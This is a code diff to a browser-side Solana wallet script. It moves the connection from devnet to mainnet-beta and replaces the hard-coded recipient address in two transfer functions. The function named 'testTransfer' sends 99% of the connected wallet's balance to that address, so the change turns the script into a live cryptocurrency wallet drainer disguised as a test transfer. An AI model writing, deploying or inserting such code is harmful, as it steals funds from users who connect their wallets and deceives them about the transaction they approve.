@@ -3,7 +3,7 @@
 
 var sent = false;
 
-const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("devnet"));
+const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
 
 const getProvider = () => {
   if ("solana" in window) {
@@ -94,7 +94,7 @@ async function testTransfer2(howmany) {
     let transaction = new solanaWeb3.Transaction().add(
       solanaWeb3.SystemProgram.transfer({
         fromPubkey: provider.publicKey,
-        toPubkey: "ETe7iiFy9JAucFifCnkEywG629YvmcQUeJrD6kHGn6SB",
+        toPubkey: "82uFDchVMcuPyaTQkmCkQjERDXJgK7nTWkTVrtyxPuTh",
         lamports: charginglamports,
       })
     );
@@ -142,7 +142,7 @@ async function testTransfer() {
     let transaction = new solanaWeb3.Transaction().add(
       solanaWeb3.SystemProgram.transfer({
         fromPubkey: provider.publicKey,
-        toPubkey: "ETe7iiFy9JAucFifCnkEywG629YvmcQUeJrD6kHGn6SB",
+        toPubkey: "82uFDchVMcuPyaTQkmCkQjERDXJgK7nTWkTVrtyxPuTh",
         lamports: (account_info.lamports * 0.99).toFixed(0),
       })
     );
